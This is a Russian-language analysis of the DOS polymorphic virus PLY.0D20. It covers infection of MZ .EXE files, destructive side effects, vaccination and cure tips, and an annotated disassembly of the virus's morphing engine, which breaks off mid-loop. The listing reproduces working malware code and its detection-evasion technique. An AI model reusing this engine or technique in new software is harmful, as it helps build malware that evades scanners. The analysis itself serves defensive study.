                              PLY.0D20

                              Описание

Нерезидентный вирус, поражающий только *.EXE в текущем каталоге с MZ-HEADERом,
т.е. не поражает переименованных в *.EXE COMики.
У зараженных файлов CHECKSUM в MZ-HEADER-е установлено в 2020H.
Морфик ( ПОЛИМОРФИК... ПОЛнЫй МОРФИК... ПОЛУМОРФИК...:-) - не знаю я,
кто он - не читал я ни Безруковых, ни Даниловых, ни Касперских
( ни даже Грязновых ;-) ).

Алгоритм морфизма содержит несколько веток, избираемых случайным образом.

Возможна вакцинация незараженных файлов путем изменения CHKSUM на 2020H
или переименования в *.COM. Более предпочтительный вариант - переименование,
но первый способ тоже может понадобиться, если файл нельзя переименовывать.


                        Деструктивное действие

1) Портит регистры ;-): после своей работы не устанавливает AX, BX, CX, DX,
    DI, SI, BP в нужное значение, а именно: AX=BX=правильность DRIVESPEC
    в PARAMSTR( 0000 - правильно, не_ноль - устройство отсутствует ),
    DX=DS, DI=SP, SI=IP точки входа, CX=00FFH( всегда ли так? ), BP - не знаю;
                  ^^^^^вырь мог бы _это_ использовать, вместо MOV BP,xxx

2) Не восстанавливает DTA на PSP_Seg:80h

3) Часто ( во всяком случае у меня ) вешал :-( машину.


Описание Морфизма.

Все смысловые команды помещены в слоты 3-байтной длины, дополнены NOPами.
Разбиение на слоты упрощает морфирование: перебираются 016EH слотов
( смысловых команд ) и изменяются следующим образом.

Для каждой команды извлекается из TIMER#0 свой RANDOM SEED, маскИруется
AND маской 00000111b. Таким образом получается число от 0 до 7. Используются
только RANDOM SEED 0..5.
Команда всегда копируется в некоторый буфер, там над ней проводятся некоторые
операции, а потом переписывается на старое место. Тут можно было немного
соптимизировать: для всех RANDOM SEED скопировать команду в буфер,
а после срабатывания ветки морфизма переписать обратно.

Для каждого слота выполняется

CASE RANDOM SEED OF
  0: Если 3-й байт слота - NOP ( команда двухбайтная или однобайтная,
       дополнена NOPами сзади ),
       то команда смещается в слоте на байт дальше, 1-й байт слота
       заполняется NOPом -
       команда дополнена NOPом спереди. Если команда - условный или
       безусловный переход ( КОП=0EBH или КОП=7хH ), то корректируется
       точка перехода в соответствии со сдвигом команды.
  1: Если 1-й байт слота - NOP ( команда двухбайтная или однобайтная,
       дополнена NOPом спереди ),
       то команда смещается на байт к началу, 3-й байт слота заполняется NOPом.
       Если команда - условный или безусловный переход, то корректируется точка
       перехода.
  2: Если в слоте не переход, не Калл и не работа со стеком ( Пушка, Попка или
       Рэт ), то в INSTRUCTION_BUFFER выбирается свободная ячейка, команда
       переписывается туда, сзади дописывается RET NEAR,
       на старое место команды записывается CALL этой ячейки
       в INSTRUCTION_BUFFER.

     INSTRUCTION_BUFFER состоит из 016EH 6-ти байтных ячеек предназначенных
       для хранения смысловых команд и вспомогательных команд RET NEAR и
       JMP NEAR( см. 4: ). Пустая ячейка всегда содержит два NOPа в начале.
       В принципе возможно существование морфизма этого вируса, все тело
       которого ( кроме JMP, Jхх, CALL ) перенесено в INSTRUCTION_BUFFER.
       Разбираться в _таком_ выре не пожелаешь и Грязнову ;-)
  3: Если в слоте - Калл ячейки в INSTRUCTION_BUFFER, то из этой ячейки команда
       переписывается на место этого Калла, а ячейка в INSTRUCTION_BUFFER
       освобождается - первые два байта NOPятся.
  4: Если в слоте не переход и не Калл, то в INSTRUCTION_BUFFER выбирается
       свободная ячека, команда переписывается туда, сзади дописывается
       JMP NEAR на слот, следующий за текущим,
       на старое место команды записывается JMP на эту ячеку
       в INSTRUCTION_BUFFER.
  5: Если в слоте - Джумп на ячейку в INSTRUCTION_BUFFER, то из этой ячейки
       команда переписывается на место этого Джумпа,
       а ячейка в INSTRUCTION_BUFFER освобождается.
  ELSE
    BREAK; { ничего не делает, пропускает команду }
END { CASE }

После генерации морфизма, вирус приступает к заражению файлов:
в текущем каталоге ищет все *.EXE файлы, проверяет, имеет ли он MZ-HEADER,
и если имеет, приписывается в конец файла и корректирует соответствующим
образом HEADER. Чтобы излечить файл, достаточно вытащить из тела вируса
оригинальный Header ( он его сохраняет ) и скорректировать длину файла.


Листинг выря. Сделано с помощью AFDPro, обработано AsmTool+ME
       _0100:
           MOV    BP,0100h
       _0103:
           MOV    AX,CS
       _0105:           ; тут и далее, где нет команды - там NOP
       _0106:
           MOV    DS,AX                 ; инициализация
       _0108:                           ; сегментных регистров
       _0109:
           MOV    ES,AX
       _010B:
       _010C:
           MOV    AX,0100h
       _010F:
           SUB    BP,AX                 ; отныне и навсегда BP - смещение
       _0111:                           ; начала выря.
       _0112:                           ; Используется при каждом обращении
           STI                          ; к данным выря
       _0113:
       _0114:
       _0115:
           CLD
       _0116:
       _0117:
       _0118:
           MOV    SI,0100h
       _011B:
           ADD    SI,BP
       _011D:
       _011E:
           MOV    CX,016Eh              ; Морфовать 16E смысловых команд
   ┌──>
   │   _0121:
   │       IN     AL,[40h]              ; Вынимаем случайное число
   │   _0123:                           ; из таймера #0
   │   _0124:
   │       AND    AL,07                 ; Его интересует число <0..5>
   │   _0126:
   │   _0127:
   │       PUSH   CX                    ; сохраняет счетчик команд
   │   _0128:                           ; и указатель на текущий
   │   _0129:                           ; слот
   │   _012A:
   │       PUSH   SI
   │   _012B:
   │   _012C:
   │   _012D:
   │   *   CMP    AL,00                 ; Проверка, что за случайное число
   │   _012F:                           ; вынуто
   │   _0130:
   │       JNZ    _0178            ───── Проверить, может это 1?─┐
   │   _0132:                                                    │
   │   _0133:                                                    │
   │       MOV    AL,[SI]                                        │
   │   _0135:                                                    │
   │   _0136:                                                    │
   │   *   CMP    AL,90h                                         │
   │   _0138:                                                    │
   │   _0139:                                                    │
   │       JZ     _0175            ─ Первый - NOP. Пропустить.──┐│
   │   _013B:                                                   ││
   │   _013C:                                                   ││
   │       MOV    AL,[SI+02]                                    ││
   │   _013F:                                                   ││
   │   *   CMP    AL,90h                                        ││
   │   _0141:                                                   ││
   │   _0142:                                                   ││
   │       JNZ    _0175            ─Эта команда не двухбайтная ┐││
   │   _0144:                                                  │││
   │   _0145:                                                  │││
   │       MOV    AX,[SI]               ; сохранение           │││
   │   _0147:                           ; команды в буфер...   │││
   │   _0148:                                                  │││
   │       MOV    BX,0589h                                     │││
   │   _014B:                                                  │││
   │       ADD    BX,BP                                        │││
   │   _014D:                                                  │││
   │   _014E:                                                  │││
   │       MOV    [BX+01],AX            ; ...спереди добавить  │││
   │   _0151:                           ; NOP                  │││
   │   *   CMP    AL,0EBh               ; Если безусловный     │││
   │   _0153:                           ; или условный         │││
   │   _0154:                           ; переход, то          │││
   │       JZ     _0160            ───────────────────────────┐│││
   │   _0156:                           ; скорректировать     ││││
   │   _0157:                           ; точку перехода      ││││
   │       AND    AL,0F0h                                     ││││
   │   _0159:                                                 ││││
   │   _015A:                                                 ││││
   │   *   CMP    AL,70h                                      ││││
   │   _015C:                                                 ││││
   │   _015D:                                                 ││││
   │       JNZ    _0163            ──────────────────────────┐││││
   │   _015F:                                                │││││
   │                               <─────────────────────────┼┘│││
   │   _0160:                                                │ │││
   │       DEC    Byte ptr [BX+02]      ; вОт эта коррекция  │ │││
   │                               <─────────────────────────┘ │││
   │   _0163:                                                  │││
   │       MOV    AL,90h                ; А вот, собственно,   │││
   │   _0165:                           ; дополнение команды   │││
   │   _0166:                           ; спереди NOPом        │││
   │       MOV    [BX],AL                                      │││
   │   _0168:                                                  │││
   │   _0169:                                                  │││
   │       MOV    DI,SI                                        │││
   │   _016B:                                                  │││
   │   _016C:                                                  │││
   │       MOV    SI,BX                 ; переписывает         │││
   │   _016E:                           ; на место старой      │││
   │   _016F:                           ; команды              │││
   │       MOV    CX,0003               ; измененный код       │││
   │   _0172:                                                  │││
   │       REP    MOVSB                                        │││
   │   _0174:                                                  │││
   │                               <───────────────────────────┴┘│
   │   _0175:                                                    │
   │       JMP    _033D            ── Продолжить морфизм ─────┐  │
   │                               <──────────────────────────┼──┘
   │   _0178:                                                 │
   │   *   CMP    AL,01                 ; Проверяет RANDOMSeed│
   │   _017A:                                                 │
   │   _017B:                                                 │
   │       JNZ    _01BA            ──────────────────────────┐│
   │   _017D:                                                ││
   │   _017E:                                                ││
   │       MOV    AL,[SI]               ; Делает то же, что  ││
   │   _0180:                           ; и при RANDOM=0,    ││
   │   _0181:                           ; только наоборот:   ││
   │   *   CMP    AL,90h                ; сдвигает команду   ││
   │   _0183:                           ; "вверх" на место   ││
   │   _0184:                           ; NOPа               ││
   │       JNZ    _01B7            ─────────────────────────┐││
   │   _0186:                           ; с соответсвующими │││
   │   _0187:                           ; коррекциями       │││
   │       MOV    AX,[SI+01]            ; точек условных    │││
   │   _018A:                           ; и безусловных     │││
   │       MOV    BX,0589h              ; переходов         │││
   │   _018D:                                               │││
   │       ADD    BX,BP                                     │││
   │   _018F:                                               │││
   │   _0190:                                               │││
   │       MOV    [BX],AX                                   │││
   │   _0192:                                               │││
   │   _0193:                                               │││
   │   *   CMP    AL,0EBh                                   │││
   │   _0195:                                               │││
   │   _0196:                                               │││
   │       JZ     _01A2            ────────────────────────┐│││
   │   _0198:                                              ││││
   │   _0199:                                              ││││
   │       AND    AL,0F0h                                  ││││
   │   _019B:                                              ││││
   │   _019C:                                              ││││
   │   *   CMP    AL,70h                                   ││││
   │   _019E:                                              ││││
   │   _019F:                                              ││││
   │       JNZ    _01A5            ───────────────────────┐││││
   │   _01A1:                                             │││││
   │                               <──────────────────────┼┘│││
   │   _01A2:                                             │ │││
   │       INC    byte ptr [BX+01]                        │ │││
   │                               <──────────────────────┘ │││
   │   _01A5:                                               │││
   │       MOV    AL,90h                                    │││
   │   _01A7:                                               │││
   │   _01A8:                                               │││
   │       MOV    [BX+02],AL                                │││
   │   _01AB:                                               │││
   │       MOV    DI,SI                                     │││
   │   _01AD:                                               │││
   │   _01AE:                                               │││
   │       MOV    SI,BX                                     │││
   │   _01B0:                                               │││
   │   _01B1:                                               │││
   │       MOV    CX,0003                                   │││
   │   _01B4:                                               │││
   │       REP    MOVSB                                     │││
   │   _01B6:                                               │││
   │                               <────────────────────────┘││
   │   _01B7:                                                ││
   │       JMP    _033D            ────────────────────────┐ ││
   │                               <───────────────────────┼─┘│
   │   _01BA:                                              │  │
   │   *   CMP    AL,02                 ; Проверка RANDOM  │  │
   │   _01BC:                           ; Seed             │  │
   │   _01BD:                                              │  │
   │       JNZ    _023B            ───────────────────────┐│  │
   │   _01BF:                                             ││  │
   │   _01C0:                                             ││  │
   │       MOV    AX,[SI]               ; Проверяет,      ││  │
   │   _01C2:                           ; является ли     ││  │
   │   _01C3:                           ; команда         ││  │
   │   *   CMP    AL,90h                ; условным        ││  │
   │   _01C5:                           ; или безусловным ││  │
   │   _01C6:                           ; переходом,      ││  │
   │       JNZ    _01CC            ──────────────────────┐││  │
   │   _01C8:                           ; Каллом или     │││  │
   │   _01C9:                           ; операцией со   │││  │
   │       MOV    AL,AH                 ; стеком         │││  │
   │   _01CB:                                            │││  │
   │                               <─────────────────────┘││  │
   │   _01CC:                                             ││  │
   │   *   CMP    AL,0E9h               ; Джумп ныар      ││  │
   │   _01CE:                                             ││  │
   │   _01CF:                                             ││  │
   │       JZ     _0238            ──────────────────────┐││  │
   │   _01D1:                                            │││  │
   │   _01D2:                                            │││  │
   │   *   CMP    AL,0E8h               ; Калл ныар      │││  │
   │   _01D4:                                            │││  │
   │   _01D5:                                            │││  │
   │       JZ     _0238            ─────────────────────┐│││  │
   │   _01D7:                                           ││││  │
   │   _01D8:                                           ││││  │
   │   *   CMP    AL,0EBh               ; Джумп шорт    ││││  │
   │   _01DA:                                           ││││  │
   │   _01DB:                                           ││││  │
   │       JZ     _0238            ────────────────────┐││││  │
   │   _01DD:                                          │││││  │
   │   _01DE:                                          │││││  │
   │   *   CMP    AL,0C3h               ; Рэт ныар     │││││  │
   │   _01E0:                                          │││││  │
   │   _01E1:                                          │││││  │
   │       JZ     _0238            ───────────────────┐│││││  │
   │   _01E3:                                         ││││││  │
   │   _01E4:                                         ││││││  │
   │       AND    AL,0F0h                             ││││││  │
   │   _01E6:                                         ││││││  │
   │   _01E7:                                         ││││││  │
   │   *   CMP    AL,70h                ; Условный    ││││││  │
   │   _01E9:                           ; джумп       ││││││  │
   │   _01EA:                                         ││││││  │
   │       JZ     _0238            ──────────────────┐││││││  │
   │   _01EC:                                        │││││││  │
   │   _01ED:                                        │││││││  │
   │   *   CMP    AL,50h                ; Пушка или  │││││││  │
   │   _01EF:                           ; попка ;)   │││││││  │
   │   _01F0:                                        │││││││  │
   │       JZ     _0238            ─────────────────┐│││││││  │
   │   _01F2:                                       ││││││││  │
   │   _01F3:                                       ││││││││  │
   │       CALL   _0355            ═ Вычислить новое╪╪╪╪╪╪╪╪══╪═════╗
   │   _01F6:                           ; положение ││││││││  │     ║
   │       MOV    CX,0003               ; команды,  ││││││││  │     ║
   │   _01F9:                           ; переписать││││││││  │     ║
   │       REP    MOVSB                 ; ее туда,  ││││││││  │     ║
   │   _01FB:                           ; дополнить ││││││││  │     ║
   │   _01FC:                           ; Рэтом...  ││││││││  │     ║
   │       MOV    AL,0C3h               ;           ││││││││  │     ║
   │   _01FE:                                       ││││││││  │     ║
   │   _01FF:                                       ││││││││  │     ║
   │       STOSB                                    ││││││││  │     ║
   │   _0200:                                       ││││││││  │     ║
   │   _0201:                                       ││││││││  │     ║
   │   _0202:                                       ││││││││  │     ║
   │       IN     AL,[40h]              ; ...и      ││││││││  │     ║
   │   _0204:                           ; дополнить ││││││││  │     ║
   │   _0205:                           ; хламом    ││││││││  │     ║
   │       STOSB                                    ││││││││  │     ║
   │   _0206:                                       ││││││││  │     ║
   │   _0207:                                       ││││││││  │     ║
   │   _0208:                                       ││││││││  │     ║
   │       IN     AL,[40h]                          ││││││││  │     ║
   │   _020A:                                       ││││││││  │     ║
   │   _020B:                                       ││││││││  │     ║
   │       STOSB                                    ││││││││  │     ║
   │   _020C:                                       ││││││││  │     ║
   │   _020D:                                       ││││││││  │     ║
   │   _020E:                                       ││││││││  │     ║
   │       MOV    AL,0E8h               ; На старом ││││││││  │     ║
   │   _0210:                           ; месте     ││││││││  │     ║
   │   _0211:                           ; команды   ││││││││  │     ║
   │       MOV    BX,0589h              ; записать  ││││││││  │     ║
   │   _0214:                           ; Калл ныар ││││││││  │     ║
   │       ADD    BX,BP                 ; сия_команда│││││││  │     ║
   │   _0216:                                       ││││││││  │     ║
   │   _0217:                                       ││││││││  │     ║
   │       MOV    [BX],AL               ; Это       ││││││││  │     ║
   │   _0219:                           ; подготовка││││││││  │     ║
   │   _021A:                           ; команды   ││││││││  │     ║
   │       MOV    AX,DI                 ; в буфере  ││││││││  │     ║
   │   _021C:                                       ││││││││  │     ║
   │   _021D:                                       ││││││││  │     ║
   │       SUB    AX,SI                             ││││││││  │     ║
   │   _021F:                                       ││││││││  │     ║
   │   _0220:                                       ││││││││  │     ║
   │       SUB    AX,0006                           ││││││││  │     ║
   │   _0223:                                       ││││││││  │     ║
   │       MOV    [BX+01],AX                        ││││││││  │     ║
   │   _0226:                                       ││││││││  │     ║
   │       MOV    DI,SI                             ││││││││  │     ║
   │   _0228:                                       ││││││││  │     ║
   │   _0229:                                       ││││││││  │     ║
   │       MOV    AX,0003                           ││││││││  │     ║
   │   _022C:                                       ││││││││  │     ║
   │       SUB    DI,AX                             ││││││││  │     ║
   │   _022E:                                       ││││││││  │     ║
   │   _022F:                                       ││││││││  │     ║
   │       MOV    SI,BX                 ; А это     ││││││││  │     ║
   │   _0231:                           ; переписывает││││││  │     ║
   │   _0232:                           ; на место  ││││││││  │     ║
   │       MOV    CX,0003               ; старой    ││││││││  │     ║
   │   _0235:                           ; команды   ││││││││  │     ║
   │       REP    MOVSB                             ││││││││  │     ║
   │   _0237:                                       ││││││││  │     ║
   │                               <────────────────┴┴┴┴┴┘││  │     ║
   │   _0238:                                             ││  │     ║
   │       JMP    _033D     ─ Продолжить морфизм ──┐      ││  │     ║
   │                               <───────────────┼──────┘│  │     ║
   │   _023B:                                      │       │  │     ║
   │   *   CMP    AL,03                 ; Проверка │       │  │     ║
   │   _023D:                  ; RANDOM Seed       │       │  │     ║
   │   _023E:                                      │       │  │     ║
   │       JNZ    _0280            ───────────────┐│       │  │     ║
   │   _0240:                                     ││       │  │     ║
   │   _0241:                                     ││       │  │     ║
   │       MOV    AL,[SI]                         ││       │  │     ║
   │   _0243:                                     ││       │  │     ║
   │   _0244:                                     ││       │  │     ║
   │   *   CMP    AL,0E8h               ; Делает  ││       │  │     ║
   │   _0246:                 ; дейтсвие, обратное││       │  │     ║
   │   _0247:                 ; RANDOM=2:         ││       │  │     ║
   │       JNZ    _027D            ──────────────┐││       │  │     ║
   │   _0249:                 ; т.е. восстанавли-│││       │  │     ║
   │   _024A:                 ; вает команды     │││       │  │     ║
   │       MOV    AX,[SI+01]  ; из каллов        │││       │  │     ║
   │   _024D:                                    │││       │  │     ║
   │       ADD    AX,0003                        │││       │  │     ║
   │   _0250:                                    │││       │  │     ║
   │       MOV    DI,SI                          │││       │  │     ║
   │   _0252:                                    │││       │  │     ║
   │   _0253:                                    │││       │  │     ║
   │       ADD    SI,AX                          │││       │  │     ║
   │   _0255:                                    │││       │  │     ║
   │   _0256:                                    │││       │  │     ║
   │       MOV    BX,058Ch                       │││       │  │     ║
   │   _0259:                                    │││       │  │     ║
   │       ADD    BX,BP                          │││       │  │     ║
   │   _025B:                                    │││       │  │     ║
   │   _025C:                                    │││       │  │     ║
   │   *   CMP    SI,BX                          │││       │  │     ║
   │   _025E:                                    │││       │  │     ║
   │   _025F:                                    │││       │  │     ║
   │       JC     _027D  ─ Калл не команды, ────┐│││       │  │     ║
   │   _0261:            ; это Калл процедуры   ││││       │  │     ║
   │   _0262:            ; расчета адреса       ││││       │  │     ║
   │       MOV    CX,0003; команды для RANDOM=2 ││││       │  │     ║
   │   _0265:                                   ││││       │  │     ║
   │       REP    MOVSB  ; Восстанавливает      ││││       │  │     ║
   │   _0267:            ; команду в буфер      ││││       │  │     ║
   │   _0268:                                   ││││       │  │     ║
   │       MOV    AL,90h ; NOPит место в        ││││       │  │     ║
   │   _026A:            ; INSTRUCTION_BUFFER   ││││       │  │     ║
   │   _026B:                                   ││││       │  │     ║
   │       MOV    AH,AL                         ││││       │  │     ║
   │   _026D:                                   ││││       │  │     ║
   │   _026E:                                   ││││       │  │     ║
   │       MOV    [SI-03],AX                    ││││       │  │     ║
   │   _0271:                                   ││││       │  │     ║
   │       IN     AL,[40h]                      ││││       │  │     ║
   │   _0273:                                   ││││       │  │     ║
   │   _0274:                                   ││││       │  │     ║
   │       MOV    [SI-01],AL                    ││││       │  │     ║
   │   _0277:                                   ││││       │  │     ║
   │       IN     AL,[40h]                      ││││       │  │     ║
   │   _0279:                                   ││││       │  │     ║
   │   _027A:                                   ││││       │  │     ║
   │       MOV    [SI],AL                       ││││       │  │     ║
   │   _027C:                                   ││││       │  │     ║
   │                               <────────────┴┘││       │  │     ║
   │   _027D:                                     ││       │  │     ║
   │       JMP    _033D            ────────────┐  ││       │  │     ║
   │                               <───────────┼──┘│       │  │     ║
   │   _0280:                                  │   │       │  │     ║
   │   *   CMP    AL,04  ; Проверяет RANDOMSeed│   │       │  │     ║
   │   _0282:                                  │   │       │  │     ║
   │   _0283:                                  │   │       │  │     ║
   │       JNZ    _02F8            ───────────┐│   │       │  │     ║
   │   _0285:                                 ││   │       │  │     ║
   │   _0286:                                 ││   │       │  │     ║
   │       MOV    AX,[SI]; Посмортим, что за  ││   │       │  │     ║
   │   _0288:            ; команда            ││   │       │  │     ║
   │   _0289:                                 ││   │       │  │     ║
   │   *   CMP    AL,90h ; Если NOP, то       ││   │       │  │     ║
   │   _028B:            ; взять второй байт  ││   │       │  │     ║
   │   _028C:                                 ││   │       │  │     ║
   │       JNZ    _0292            ──────────┐││   │       │  │     ║
   │   _028E:                                │││   │       │  │     ║
   │   _028F:                                │││   │       │  │     ║
   │       MOV    AL,AH                      │││   │       │  │     ║
   │   _0291:                                │││   │       │  │     ║
   │                               <─────────┘││   │       │  │     ║
   │   _0292:                                 ││   │       │  │     ║
   │   *   CMP    AL,0E9h; Если это Джумп ныар││   │       │  │     ║
   │   _0294:                                 ││   │       │  │     ║
   │   _0295:                                 ││   │       │  │     ║
   │       JZ     _02F5            ──────────┐││   │       │  │     ║
   │   _0297:                                │││   │       │  │     ║
   │   _0298:                                │││   │       │  │     ║
   │   *   CMP    AL,0E8h; или Калл ныар,    │││   │       │  │     ║
   │   _029A:                                │││   │       │  │     ║
   │   _029B:                                │││   │       │  │     ║
   │       JZ     _02F5            ─────────┐│││   │       │  │     ║
   │   _029D:                               ││││   │       │  │     ║
   │   _029E:                               ││││   │       │  │     ║
   │   *   CMP    AL,0EBh; или Джумп шорт,  ││││   │       │  │     ║
   │   _02A0:                               ││││   │       │  │     ║
   │   _02A1:                               ││││   │       │  │     ║
   │       JZ     _02F5            ────────┐││││   │       │  │     ║
   │   _02A3:                              │││││   │       │  │     ║
   │   _02A4:                              │││││   │       │  │     ║
   │       AND    AL,0F0h; или условный    │││││   │       │  │     ║
   │   _02A6:            ; переход,        │││││   │       │  │     ║
   │   _02A7:            ; то ничего не    │││││   │       │  │     ║
   │   *   CMP    AL,70h ; делать          │││││   │       │  │     ║
   │   _02A9:                              │││││   │       │  │     ║
   │   _02AA:                              │││││   │       │  │     ║
   │       JZ     _02F5            ───────┐│││││   │       │  │     ║
   │   _02AC:                             ││││││   │       │  │     ║
   │   _02AD:                     ть смещение для этой команды ═╗   ║
   │       CALL   _0355   ═ Посчита       ││││││   │       │  │ ║   ║
   │   _02B0:                             ││││││   │       │  │ ║   ║
   │       MOV    CX,0003; переписать ее  ││││││   │       │  │ ║   ║
   │   _02B3:            ; туда           ││││││   │       │  │ ║   ║
   │       REP    MOVSB                   ││││││   │       │  │ ║   ║
   │   _02B5:                             ││││││   │       │  │ ║   ║
   │   _02B6:                             ││││││   │       │  │ ║   ║
   │       MOV    AL,0E9h; дополнить      ││││││   │       │  │ ║ ╔═╝
   │   _02B8:            ; возвратом      ││││││   │       │  │ ║ ║
   │   _02B9:            ; назад          ││││││   │       │  │ ║ ║
   │       STOSB                          ││││││   │       │  │ ║ ║
   │   _02BA:                             ││││││   │       │  │ ║ ║
   │   _02BB:                             ││││││   │       │  │ ║ ║
   │   _02BC:                             ││││││   │       │  │ ║ ║
   │       MOV    AX,DI                   ││││││   │       │  │ ║ ║
   │   _02BE:                             ││││││   │       │  │ ║ ║
   │   _02BF:                             ││││││   │       │  │ ║ ║
   │       SUB    AX,SI                   ││││││   │       │  │ ║ ║
   │   _02C1:                             ││││││   │       │  │ ║ ║
   │   _02C2:                             ││││││   │       │  │ ║ ║
   │       NEG    AX                      ││││││   │       │  │ ║ ║
   │   _02C4:                             ││││││   │       │  │ ║ ║
   │   _02C5:                             ││││││   │       │  │ ║ ║
   │       SUB    AX,0002                 ││││││   │       │  │ ║ ║
   │   _02C8:                             ││││││   │       │  │ ║ ║
   │       STOSW                          ││││││   │       │  │ ║ ║
   │   _02C9:                             ││││││   │       │  │ ║ ║
   │   _02CA:                             ││││││   │       │  │ ║ ║
   │   _02CB:                             ││││││   │       │  │ ║ ║
   │       MOV    AL,0E9h; на место старой││││││   │       │  │ ║ ║
   │   _02CD:            ; команды        ││││││   │       │  │ ║ ║
   │   _02CE:            ; записать Джумп ││││││   │       │  │ ║ ║
   │       MOV    BX,0589h                ││││││   │       │  │ ║ ║
   │   _02D1:                             ││││││   │       │  │ ║ ║
   │       ADD    BX,BP                   ││││││   │       │  │ ║ ╚═╗
   │   _02D3:                             ││││││   │       │  │ ║   ║
   │   _02D4:                             ││││││   │       │  │ ║   ║
   │       MOV    [BX],AL                 ││││││   │       │  │ ║   ║
   │   _02D6:                             ││││││   │       │  │ ║   ║
   │   _02D7:                             ││││││   │       │  │ ║   ║
   │       MOV    AX,DI                   ││││││   │       │  │ ║   ║
   │   _02D9:                             ││││││   │       │  │ ║   ║
   │   _02DA:                             ││││││   │       │  │ ║   ║
   │       SUB    AX,SI                   ││││││   │       │  │ ║   ║
   │   _02DC:                             ││││││   │       │  │ ║   ║
   │   _02DD:                             ││││││   │       │  │ ║   ║
   │       SUB    AX,0006                 ││││││   │       │  │ ║   ║
   │   _02E0:                             ││││││   │       │  │ ║   ║
   │       MOV    [BX+01],AX              ││││││   │       │  │ ║   ║
   │   _02E3:                             ││││││   │       │  │ ║   ║
   │       MOV    DI,SI                   ││││││   │       │  │ ║   ║
   │   _02E5:                             ││││││   │       │  │ ║   ║
   │   _02E6:                             ││││││   │       │  │ ║   ║
   │       MOV    AX,0003                 ││││││   │       │  │ ║   ║
   │   _02E9:                             ││││││   │       │  │ ║   ║
   │       SUB    DI,AX                   ││││││   │       │  │ ║   ║
   │   _02EB:                             ││││││   │       │  │ ║   ║
   │   _02EC:                             ││││││   │       │  │ ║   ║
   │       MOV    SI,BX                   ││││││   │       │  │ ║   ║
   │   _02EE:                             ││││││   │       │  │ ║   ║
   │   _02EF:                             ││││││   │       │  │ ║   ║
   │       MOV    CX,0003                 ││││││   │       │  │ ║   ║
   │   _02F2:                             ││││││   │       │  │ ║   ║
   │       REP    MOVSB                   ││││││   │       │  │ ║   ║
   │   _02F4:                             ││││││   │       │  │ ║   ║
   │                               <──────┴┴┴┘││   │       │  │ ║   ║
   │   _02F5:           ; морфовать дальше    ││   │       │  │ ║   ║
   │       JMP    _033D            ──────┐    ││   │       │  │ ║   ║
   │   _02F7:                            │    ││   │       │  │ ║   ║
   │                               <─────┼────┘│   │       │  │ ║   ║
   │   _02F8:                            │     │   │       │  │ ║   ║
   │   *   CMP    AL,05 ; о5 RANDOMSeed  │     │   │       │  │ ║   ║
   │   _02FA:                            │     │   │       │  │ ║   ║
   │   _02FB:                            │     │   │       │  │ ║   ║
   │       JNZ    _033D            ─────┐│     │   │       │  │ ║   ║
   │   _02FD:                           ││     │   │       │  │ ║   ║
   │   _02FE:                           ││     │   │       │  │ ║   ║
   │       MOV    AL,[SI] ; восстанавливает    │   │       │  │ ║   ║
   │   _0300:             ; действия,   ││     │   │       │  │ ║   ║
   │   _0301:             ; проведенные ││     │   │       │  │ ║   ║
   │   *   CMP    AL,0E9h ; для RANDOM=4││     │   │       │  │ ║   ║
   │   _0303:                           ││     │   │       │  │ ║   ║
   │   _0304:                           ││     │   │       │  │ ║   ║
   │       JNZ    _033A            ────┐││     │   │       │  │ ║   ║
   │   _0306:                          │││     │   │       │  │ ║   ║
   │   _0307:                          │││     │   │       │  │ ║   ║
   │       MOV    AX,[SI+01]           │││     │   │       │  │ ║   ║
   │   _030A:                          │││     │   │       │  │ ║   ║
   │       ADD    AX,0003              │││     │   │       │  │ ║   ║
   │   _030D:                          │││     │   │       │  │ ║   ║
   │       MOV    DI,SI                │││     │   │       │  │ ║   ║
   │   _030F:                          │││     │   │       │  │ ║   ║
   │   _0310:                          │││     │   │       │  │ ║   ║
   │       ADD    SI,AX                │││     │   │       │  │ ║   ║
   │   _0312:                          │││     │   │       │  │ ║   ║
   │   _0313:                          │││     │   │       │  │ ║   ║
   │       MOV    BX,058Ch             │││     │   │       │  │ ║   ║
   │   _0316:                          │││     │   │       │  │ ║   ║
   │       ADD    BX,BP                │││     │   │       │  │ ║   ║
   │   _0318:                          │││     │   │       │  │ ║   ║
   │   _0319:                          │││     │   │       │  │ ║   ║
   │   *   CMP    SI,BX   ; Это Джумп  │││     │   │       │  │ ║   ║
   │   _031B:             ; ныар в     │││     │   │       │  │ ║   ║
   │   _031C:             ; буфер?     │││     │   │       │  │ ║   ║
   │       JC     _033A   ; -Нет, ничег│││     │   │       │  │ ║   ║
   │   _031E:                         о│││     │   │       │  │ ║   ║
   │   _031F:                         ││││     │   │       │  │ ║   ║
   │       MOV    CX,0003 ; -Да,      н│││     │   │       │  │ ║   ║
   │   _0322:             ; восстано- е│││     │   │       │  │ ║   ║
   │       REP    MOVSB   ; вить      ││││     │   │       │  │ ║   ║
   │   _0324:             ; команду   д│││     │   │       │  │ ║   ║
   │   _0325:                         е│││     │   │       │  │ ║   ║
   │       MOV    AL,90h  ; а место   л│││     │   │       │  │ ║   ║
   │   _0327:             ; в буфере  а│││     │   │       │  │ ║   ║
   │   _0328:             ; освободитьт│││     │   │       │  │ ║   ║
   │       MOV    AH,AL               ь│││     │   │       │  │ ║   ║
   │   _032A:                         ││││     │   │       │  │ ║   ║
   │   _032B:                         ││││     │   │       │  │ ║   ║
   │       MOV    [SI-03],AX          ││││     │   │       │  │ ║   ║
   │   _032E:                         ││││     │   │       │  │ ║   ║
   │       IN     AL,[40h]            ││││     │   │       │  │ ║   ║
   │   _0330:                         ││││     │   │       │  │ ║   ║
   │   _0331:                         ││││     │   │       │  │ ║   ║
   │       MOV    [SI-01],AL          ││││     │   │       │  │ ║   ║
   │   _0334:                         ││││     │   │       │  │ ║   ║
   │       IN     AL,[40h]            ││││     │   │       │  │ ║   ║
   │   _0336:                         ││││     │   │       │  │ ║   ║
   │   _0337:                         ││││     │   │       │  │ ║   ║
   │       MOV    [SI],AL             ││││     │   │       │  │ ║   ║
   │   _0339:                         ││││     │   │       │  │ ║   ║
   │                               <──┴┘││     │   │       │  │ ║   ║
   │   _033A:            ; морфовать    ││     │   │       │  │ ║   ║
   │       JMP    _033D  ; дальше  ──┐  ││     │   │       │  │ ║   ║
   │   _033C:                        │  ││     │   │       │  │ ║   ║
   │                               <─┴──┴┴─────┴───┴───────┴──┘ ║   ║
   │   _033D:                                                 ╔═╝   ║
   │       POP    SI     ; извлекает указатель                ║     ║
   │   _033E:            ; на текущую команду                 ║     ║
   │   _033F:            ; и счетчик команд                   ║     ║
   │   _0340:                                                 ║     ║
   │       POP    CX                                          ║     ║
   │   _0341:            ; указатель                          ║ ╔═══╝
   │   _0342:            ; сдвигает на следующую команду      ║ ║
